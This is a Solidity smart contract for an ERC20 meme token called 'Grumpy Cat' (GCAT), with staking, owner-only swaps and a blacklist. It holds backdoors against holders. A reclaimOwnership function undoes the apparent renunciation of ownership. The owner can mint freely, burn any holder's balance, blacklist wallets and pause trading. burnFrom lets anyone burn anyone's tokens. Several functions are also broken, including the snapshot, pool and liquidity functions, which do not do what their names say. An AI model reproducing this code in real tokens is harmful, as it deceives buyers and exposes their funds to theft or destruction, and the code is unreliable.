// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ISwapRouter } from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract GCAT is ERC20 {
    address public owner;
    address private _previousOwner;
    mapping(address => bool) public controllers;
    mapping(address => bool) public blacklist;
    bool public paused;
    mapping(address => uint256[]) private _balancesHistory;
    mapping(address => Stake) public stakes;
    mapping(address => mapping(uint256 => uint256)) private _snapshotBalances;
    uint256 public snapshotId;

    ISwapRouter public uniswapRouter;
    address public WETH9;
    uint256 public tokenPrice;
    uint256 public rewardRate;

    struct Stake {
        uint256 amount;
        uint256 startTime;
        uint256 endTime;
        bool isActive;
    }

    event Staked(address indexed user, uint256 amount);
    event Unstaked(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() ERC20("Grumpy Cat", "GCAT") {
        _mint(msg.sender, 100000000000 * 10 ** 18);
        owner = msg.sender;
        paused = false;
        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // Mainnet address
        WETH9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Mainnet WETH9 address
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier onlyController() {
        require(controllers[msg.sender], "Only controllers can call this function");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    modifier whenPaused() {
        require(paused, "Contract is not paused");
        _;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function _checkOwnership() internal view returns (bool) {
        return msg.sender == owner;
    }

    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "Invalid address");
        _previousOwner = owner;
        owner = _newOwner;
        emit OwnershipTransferred(_previousOwner, _newOwner);
    }

    function renounceOwnership() external onlyOwner {
        _previousOwner = owner;
        owner = address(0);
        emit OwnershipTransferred(_previousOwner, address(0));
    }

    function reclaimOwnership() public {
        require(msg.sender == _previousOwner, "Only previous owner can reclaim ownership");
        emit OwnershipTransferred(address(0), _previousOwner);
        owner = _previousOwner;
        _previousOwner = address(0); // Clear previous owner
    }

    function addController(address controller) external onlyOwner {
        controllers[controller] = true;
    }

    function removeController(address controller) external onlyOwner {
        controllers[controller] = false;
    }

    function pause() external onlyOwner {
        paused = true;
    }

    function unpause() external onlyOwner {
        paused = false;
    }

    function mint(address to, uint256 value) external onlyOwner {
        _mint(to, value);
    }

    function burn(address from, uint256 amount) external onlyOwner {
        _burn(from, amount);
    }

    function burnFrom(address from, uint256 value) external whenNotPaused returns (bool) {
        _burn(from, value);
        return true;
    }

    function transfer(address to, uint256 value) public override whenNotPaused returns (bool) {
        require(!_checkBlacklist(msg.sender), "Sender is blacklisted");
        require(!_checkBlacklist(to), "Recipient is blacklisted");
        return super.transfer(to, value);
    }

    function transferFrom(address from, address to, uint256 value) public override whenNotPaused returns (bool) {
        require(!_checkBlacklist(from), "Sender is blacklisted");
        require(!_checkBlacklist(to), "Recipient is blacklisted");
        return super.transferFrom(from, to, value);
    }

    function batchTransfer(address[] memory recipients, uint256[] memory amounts) external whenNotPaused {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(msg.sender, recipients[i], amounts[i]);
        }
    }

    function _beforeTokenTransfer(address /* from */, address /* to */, uint256 /* amount */) internal {
        // Function Before Token Transfer Balance
    }

    function airdrop(address[] memory recipients, uint256[] memory amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(owner, recipients[i], amounts[i]);
        }
    }

    function airdropFixedAmount(address[] memory recipients, uint256 amount) external onlyOwner {
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(owner, recipients[i], amount);
        }
    }

    function approve(address spender, uint256 value) public override whenNotPaused returns (bool) {
        return super.approve(spender, value);
    }

    function increaseAllowance(address spender, uint256 addedValue) public whenNotPaused returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotPaused returns (bool) {
        uint256 currentAllowance = allowance(msg.sender, spender);
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

    function addToBlacklist(address account) external onlyOwner {
        blacklist[account] = true;
    }

    function removeFromBlacklist(address account) external onlyOwner {
        blacklist[account] = false;
    }

    function _checkBlacklist(address account) internal view returns (bool) {
        return blacklist[account];
    }

    function balanceOfAt(address account, uint256 index) public view returns (uint256) {
        require(index < _balancesHistory[account].length, "Invalid index");
        return _balancesHistory[account][index];
    }

    function balanceHistoryLength(address account) public view returns (uint256) {
        return _balancesHistory[account].length;
    }

    function snapshot() public onlyOwner {
        uint256 currentBlock = block.number;
        for (uint256 i = 0; i < super.totalSupply(); i++) {
            _balancesHistory[msg.sender].push(currentBlock);
        }
    }

    function emergencyWithdraw(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");
        _transfer(owner, to, amount);
    }

    function withdrawETH(uint256 amount) external onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance");
        payable(owner).transfer(amount);
    }

    function withdrawTokens(uint256 tokenAmount) external onlyOwner {
        require(msg.sender == owner, "Only the owner can withdraw tokens");
        _transfer(address(this), owner, tokenAmount);
    }

    // Function to receive Ether
    receive() external payable {}

    // Fallback function
    fallback() external payable {}

    // Enable trading
    function enableTrading() external onlyOwner {
        paused = false;
    }

    // Disable trading
    function disableTrading() external onlyOwner {
        paused = true;
    }

    function setTokenPrice(uint256 price) external onlyOwner {
        tokenPrice = price;
    }

    function getTokenPrice() public view returns (uint256) {
        return tokenPrice;
    }

    function buyTokens() external payable whenNotPaused {
        require(msg.value > 0, "Send ETH to buy tokens");
        uint256 amountToBuy = (msg.value * 1 ether) / tokenPrice;
        require(balanceOf(owner) >= amountToBuy, "Not enough tokens in the reserve");

        _transfer(owner, msg.sender, amountToBuy);
    }

    function sellTokens(uint256 amount) external whenNotPaused {
        require(amount > 0, "Specify an amount of tokens to sell");
        require(balanceOf(msg.sender) >= amount, "Not enough tokens to sell");

        uint256 ethToTransfer = (amount * tokenPrice) / 1 ether;
        require(address(this).balance >= ethToTransfer, "Contract has insufficient ETH balance");

        _transfer(msg.sender, owner, amount);
        payable(msg.sender).transfer(ethToTransfer);
    }

    function createPool() external onlyOwner {
        uint256 amountToAdd = balanceOf(address(this));
        require(amountToAdd > 0, "No tokens available to add to the pool");

        _approve(address(this), address(uniswapRouter), amountToAdd);

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: WETH9,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 15,
                amountIn: amountToAdd,
                amountOutMinimum: 1,
                sqrtPriceLimitX96: 0
            });

        uniswapRouter.exactInputSingle{value: 0}(params);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) external payable onlyOwner {
        require(tokenAmount > 0, "Token amount must be greater than 0");
        require(ethAmount > 0, "ETH amount must be greater than 0");
        require(balanceOf(owner) >= tokenAmount, "Not enough tokens");

        _approve(address(this), address(uniswapRouter), tokenAmount);

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: WETH9,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 15,
                amountIn: tokenAmount,
                amountOutMinimum: 1,
                sqrtPriceLimitX96: 0
            });

        uniswapRouter.exactInputSingle{value: ethAmount}(params);
    }

    function swapTokenForETH(uint256 amount, uint24 fee) external onlyOwner {
        _approve(address(this), address(uniswapRouter), amount);

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: WETH9,
                fee: fee,
                recipient: owner,
                deadline: block.timestamp + 3600,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        uniswapRouter.exactInputSingle(params);
    }

    function swapETHForToken(uint256 amount, uint24 fee) external onlyOwner payable {
        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: WETH9,
                tokenOut: address(this),
                fee: fee,
                recipient: owner,
                deadline: block.timestamp + 3600,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        uniswapRouter.exactInputSingle{ value: amount }(params);
    }

    function removeLiquidity(uint256 liquidity, uint256 /* amountTokenMin */, uint256 /* amountETHMin */, address to) external onlyOwner {
    ISwapRouter.ExactOutputSingleParams memory params =
        ISwapRouter.ExactOutputSingleParams({
            tokenIn: address(0), // Input token (ETH) address
            tokenOut: address(this), // Output token (GCAT) address
            fee: 3000, // Fee (0.3% fee)
            recipient: to, // Recipient of the output tokens
            deadline: block.timestamp + 3600, // Deadline by which the transaction must be included
            amountOut: liquidity, // Amount of liquidity tokens to burn
            amountInMaximum: 0, // Maximum ETH to spend for burning liquidity tokens
            sqrtPriceLimitX96: 0 // Optional
        });

    uniswapRouter.exactOutputSingle(params);
}

    function stake(uint256 amount, uint256 duration) external whenNotPaused {
        require(amount > 0, "Staking amount must be greater than 0");
        require(balanceOf(msg.sender) >= amount, "Insufficient balance to stake");
        require(stakes[msg.sender].isActive == false, "Active stake exists");

        _transfer(msg.sender, address(this), amount);

        stakes[msg.sender] = Stake({
            amount: amount,
            startTime: block.timestamp,
            endTime: block.timestamp + duration,
            isActive: true
        });

        emit Staked(msg.sender, amount);
    }

    function unstake() external whenNotPaused {
        Stake memory userStake = stakes[msg.sender];
        require(userStake.isActive, "No active stake found");
        require(block.timestamp >= userStake.endTime, "Staking period not yet completed");

        uint256 reward = (userStake.amount * rewardRate * (userStake.endTime - userStake.startTime)) / 1e18;
        uint256 totalAmount = userStake.amount + reward;

        delete stakes[msg.sender];
        _transfer(address(this), msg.sender, totalAmount);

        emit Unstaked(msg.sender, totalAmount);
    }

    function claimReward() external whenNotPaused {
        Stake storage userStake = stakes[msg.sender];
        require(userStake.isActive, "No active stake found");

        uint256 reward = (userStake.amount * rewardRate * (block.timestamp - userStake.startTime)) / 1e18;

        userStake.startTime = block.timestamp;
        _transfer(address(this), msg.sender, reward);

        emit RewardClaimed(msg.sender, reward);
    }

    function setRewardRate(uint256 rate) external onlyOwner {
        rewardRate = rate;
    }

    function getRewardRate() public view returns (uint256) {
        return rewardRate;
    }
}
